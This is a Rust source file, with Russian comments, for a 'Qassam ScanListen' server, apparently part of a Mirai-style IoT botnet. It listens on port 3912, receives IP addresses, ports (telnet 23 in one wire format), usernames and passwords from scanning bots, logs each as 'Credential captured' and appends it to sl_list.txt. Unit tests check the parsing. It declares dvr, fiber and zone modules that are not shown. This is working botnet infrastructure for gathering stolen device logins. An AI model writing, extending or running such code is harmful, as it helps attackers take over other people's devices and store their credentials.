use anyhow::{Context, Result};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
    sync::Mutex,
    time::timeout,
};
use tracing::{debug, error, info, warn};
use std::sync::Arc;
use std::collections::HashMap;
use serde::Deserialize;

pub mod zone;
pub mod dvr;
pub mod fiber;

#[derive(Debug, Deserialize, Clone)]
pub struct ScanListenConfig {
    pub bind_address: String,
    pub timeout_seconds: u64,
    pub output_file: String,
    pub max_connections: usize,
}



impl Default for ScanListenConfig {
    fn default() -> Self {
        Self {
            bind_address: "0.0.0.0:3912".to_string(),
            timeout_seconds: 10,
            output_file: "sl_list.txt".to_string(),
            max_connections: 1000,
        }
    }
}

#[derive(Debug, Clone)]
pub struct CredentialEntry {
    pub ip: String,
    pub port: u16,
    pub username: String,
    pub password: String,
    pub timestamp: std::time::SystemTime,
}

pub struct ScanListenServer {
    config: ScanListenConfig,
    stats: Arc<Mutex<ServerStats>>,
}

#[derive(Debug, Default)]
struct ServerStats {
    total_connections: u64,
    successful_parses: u64,
    failed_parses: u64,
    bytes_received: u64,
}

impl ScanListenServer {
    pub fn new(config: ScanListenConfig) -> Self {
        Self {
            config,
            stats: Arc::new(Mutex::new(ServerStats::default())),
        }
    }

    pub async fn run(&self) -> Result<()> {
        let listener = TcpListener::bind(&self.config.bind_address).await
            .with_context(|| format!("Failed to bind to {}", self.config.bind_address))?;

        info!("ScanListen server started on {}", self.config.bind_address);

        let stats = Arc::clone(&self.stats);

        // Запускаем сбор статистики
        let stats_clone = Arc::clone(&stats);
        tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_secs(5));
            loop {
                interval.tick().await;
                let stats = stats_clone.lock().await;
                info!(
                    "Stats - Connections: {}, Successful: {}, Failed: {}, Bytes: {}",
                    stats.total_connections, stats.successful_parses, stats.failed_parses, stats.bytes_received
                );
            }
        });

        loop {
            let (socket, addr) = listener.accept().await?;

            let stats = Arc::clone(&self.stats);
            let config = self.config.clone();

            tokio::spawn(async move {
                if let Err(e) = Self::handle_connection(socket, addr, config, stats).await {
                    warn!("Connection from {} failed: {}", addr, e);
                }
            });
        }
    }

    async fn handle_connection(
        socket: TcpStream,
        addr: SocketAddr,
        config: ScanListenConfig,
        stats: Arc<Mutex<ServerStats>>,
    ) -> Result<()> {
        debug!("New connection from {}", addr);

        {
            let mut stats_guard = stats.lock().await;
            stats_guard.total_connections += 1;
        }

        let timeout_duration = Duration::from_secs(config.timeout_seconds);

        let result = timeout(timeout_duration, async {
            Self::process_connection(socket, &config, stats.clone()).await
        }).await;

        match result {
            Ok(Ok(credential)) => {
                info!(
                    "Credential captured: {}:{} {}:{}",
                    credential.ip, credential.port, credential.username, credential.password
                );

                if let Err(e) = Self::save_credential(&credential, &config.output_file).await {
                    error!("Failed to save credential: {}", e);
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to process connection: {}", e);
                let mut stats_guard = stats.lock().await;
                stats_guard.failed_parses += 1;
            }
            Err(_) => {
                warn!("Connection timeout from {}", addr);
                let mut stats_guard = stats.lock().await;
                stats_guard.failed_parses += 1;
            }
        }

        Ok(())
    }

    async fn process_connection(
        mut socket: TcpStream,
        config: &ScanListenConfig,
        stats: Arc<Mutex<ServerStats>>,
    ) -> Result<CredentialEntry> {
        // Читаем первый байт для определения формата
        let buf_chk = Self::read_x_bytes(&mut socket, 1).await?;

        let (ip_int, port_int) = if buf_chk[0] == 0 {
            // Формат 1: 4 байта IP + 2 байта порта
            let ip_buf = Self::read_x_bytes(&mut socket, 4).await?;
            let port_buf = Self::read_x_bytes(&mut socket, 2).await?;

            let ip_int = u32::from_be_bytes([ip_buf[0], ip_buf[1], ip_buf[2], ip_buf[3]]);
            let port_int = u16::from_be_bytes([port_buf[0], port_buf[1]]);

            (ip_int, port_int)
        } else {
            // Формат 2: 3 байта IP (первый байт уже прочитан) + фиксированный порт 23
            let ip_buf_remaining = Self::read_x_bytes(&mut socket, 3).await?;
            let ip_buf = [buf_chk[0], ip_buf_remaining[0], ip_buf_remaining[1], ip_buf_remaining[2]];

            let ip_int = u32::from_be_bytes(ip_buf);
            let port_int = 23; // Фиксированный порт для этого формата

            (ip_int, port_int)
        };

        // Читаем имя пользователя
        let u_len_buf = Self::read_x_bytes(&mut socket, 1).await?;
        let username_len = u_len_buf[0] as usize;
        let username_buf = Self::read_x_bytes(&mut socket, username_len).await?;
        let username = String::from_utf8(username_buf)
            .context("Invalid UTF-8 in username")?;

        // Читаем пароль
        let p_len_buf = Self::read_x_bytes(&mut socket, 1).await?;
        let password_len = p_len_buf[0] as usize;
        let password_buf = Self::read_x_bytes(&mut socket, password_len).await?;
        let password = String::from_utf8(password_buf)
            .context("Invalid UTF-8 in password")?;

        // Преобразуем IP в строку
        let ip = format!(
            "{}.{}.{}.{}",
            (ip_int >> 24) & 0xff,
            (ip_int >> 16) & 0xff,
            (ip_int >> 8) & 0xff,
            ip_int & 0xff
        );

        let credential = CredentialEntry {
            ip,
            port: port_int,
            username,
            password,
            timestamp: std::time::SystemTime::now(),
        };

        {
            let mut stats_guard = stats.lock().await;
            stats_guard.successful_parses += 1;
        }

        Ok(credential)
    }

    async fn read_x_bytes(socket: &mut TcpStream, amount: usize) -> Result<Vec<u8>> {
        let mut buf = vec![0u8; amount];
        let mut total_read = 0;

        while total_read < amount {
            match socket.read(&mut buf[total_read..]).await {
                Ok(0) => {
                    return Err(anyhow::anyhow!("Connection closed unexpectedly"));
                }
                Ok(n) => {
                    total_read += n;
                }
                Err(e) => {
                    return Err(anyhow::anyhow!("Failed to read from socket: {}", e));
                }
            }
        }

        Ok(buf)
    }

    async fn save_credential(credential: &CredentialEntry, output_file: &str) -> Result<()> {
        use tokio::fs::OpenOptions;
        use tokio::io::AsyncWriteExt;

        let line = format!(
            "{}:{} {}:{}\n",
            credential.ip, credential.port, credential.username, credential.password
        );

        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(output_file)
            .await
            .with_context(|| format!("Failed to open file: {}", output_file))?;

        file.write_all(line.as_bytes()).await
            .with_context(|| format!("Failed to write to file: {}", output_file))?;

        file.flush().await?;

        Ok(())
    }

    pub async fn get_stats(&self) -> ServerStats {
        self.stats.lock().await.clone()
    }
}

impl Clone for ServerStats {
    fn clone(&self) -> Self {
        Self {
            total_connections: self.total_connections,
            successful_parses: self.successful_parses,
            failed_parses: self.failed_parses,
            bytes_received: self.bytes_received,
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Инициализация логирования
    tracing_subscriber::fmt::init();

    // Загрузка конфигурации
    let config = match load_config().await {
        Ok(cfg) => {
            info!("Loaded configuration: {:?}", cfg);
            cfg
        }
        Err(e) => {
            warn!("Failed to load config, using defaults: {}", e);
            ScanListenConfig::default()
        }
    };

    // Создание и запуск сервера
    let server = ScanListenServer::new(config);

    info!("Starting Qassam ScanListen server...");

    if let Err(e) = server.run().await {
        error!("Server error: {}", e);
        std::process::exit(1);
    }

    Ok(())
}

async fn load_config() -> Result<ScanListenConfig> {
    use config::{Config, File};

    let settings = Config::builder()
        .add_source(File::with_name("config/scan_listen").required(false))
        .build()?;

    settings.try_deserialize().map_err(Into::into)
}

// Тесты
#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpStream;
    use std::net::TcpListener as StdTcpListener;

    #[tokio::test]
    async fn test_read_x_bytes() {
        let (mut client, mut server) = create_test_connection().await;

        // Тест нормального чтения
        client.write_all(b"test").await.unwrap();
        let result = ScanListenServer::read_x_bytes(&mut server, 4).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), b"test");

        // Тест неполного чтения
        client.write_all(b"par").await.unwrap();
        let result = ScanListenServer::read_x_bytes(&mut server, 4).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_credential_parsing_format1() {
        let (mut client, server) = create_test_connection().await;

        // Формат 1: [0] + [IP 4 bytes] + [PORT 2 bytes] + username + password
        let test_data = vec![
            0u8,                    // формат 1
            192, 168, 1, 1,        // IP: 192.168.1.1
            0x1F, 0x90,            // PORT: 8080
            4u8,                    // длина username: 4
            b't', b'e', b's', b't', // username: "test"
            8u8,                    // длина password: 8
            b'p', b'a', b's', b's', b'w', b'o', b'r', b'd' // password: "password"
        ];

        client.write_all(&test_data).await.unwrap();

        let config = ScanListenConfig::default();
        let stats = Arc::new(Mutex::new(ServerStats::default()));

        let result = ScanListenServer::process_connection(server, &config, stats).await;
        assert!(result.is_ok());

        let credential = result.unwrap();
        assert_eq!(credential.ip, "192.168.1.1");
        assert_eq!(credential.port, 8080);
        assert_eq!(credential.username, "test");
        assert_eq!(credential.password, "password");
    }

    #[tokio::test]
    async fn test_credential_parsing_format2() {
        let (mut client, server) = create_test_connection().await;

        // Формат 2: [first_byte != 0] + [remaining 3 IP bytes] + username + password
        let test_data = vec![
            10u8,                   // первый байт IP (и индикатор формата 2)
            0, 0, 1,               // остальные 3 байта IP: 10.0.0.1
            4u8,                    // длина username: 4
            b'u', b's', b'e', b'r', // username: "user"
            4u8,                    // длина password: 4
            b'p', b'a', b's', b's'  // password: "pass"
        ];

        client.write_all(&test_data).await.unwrap();

        let config = ScanListenConfig::default();
        let stats = Arc::new(Mutex::new(ServerStats::default()));

        let result = ScanListenServer::process_connection(server, &config, stats).await;
        assert!(result.is_ok());

        let credential = result.unwrap();
        assert_eq!(credential.ip, "10.0.0.1");
        assert_eq!(credential.port, 23); // фиксированный порт для формата 2
        assert_eq!(credential.username, "user");
        assert_eq!(credential.password, "pass");
    }

    #[test]
    fn test_ip_conversion() {
        let ip_int = 0xC0A80101u32 as i32; // 192.168.1.1
        let ip = format!(
            "{}.{}.{}.{}",
            (ip_int >> 24) & 0xff,
            (ip_int >> 16) & 0xff,
            (ip_int >> 8) & 0xff,
            ip_int & 0xff
        );
        assert_eq!(ip, "192.168.1.1");
    }

    async fn create_test_connection() -> (TcpStream, TcpStream) {
        let std_listener = StdTcpListener::bind("127.0.0.1:0").unwrap();
        let addr = std_listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            let (socket, _) = tokio::net::TcpListener::from_std(std_listener).unwrap().accept().await.unwrap();
            socket
        });

        let client = TcpStream::connect(addr).await.unwrap();
        let server = server_handle.await.unwrap();

        (client, server)
    }

    #[tokio::test]
    async fn test_save_credential() {
        let temp_file = "test_credentials.txt";
        let credential = CredentialEntry {
            ip: "127.0.0.1".to_string(),
            port: 8080,
            username: "testuser".to_string(),
            password: "testpass".to_string(),
            timestamp: std::time::SystemTime::now(),
        };

        let result = ScanListenServer::save_credential(&credential, temp_file).await;
        assert!(result.is_ok());

        // Проверяем что файл создан и содержит правильные данные
        let content = tokio::fs::read_to_string(temp_file).await.unwrap();
        assert!(content.contains("127.0.0.1:8080 testuser:testpass"));

        // Убираем за собой
        let _ = tokio::fs::remove_file(temp_file).await;
    }

    #[tokio::test]
    async fn test_server_stats() {
        let stats = ServerStats::default();
        assert_eq!(stats.total_connections, 0);
        assert_eq!(stats.successful_parses, 0);
        assert_eq!(stats.failed_parses, 0);
        assert_eq!(stats.bytes_received, 0);
    }
}















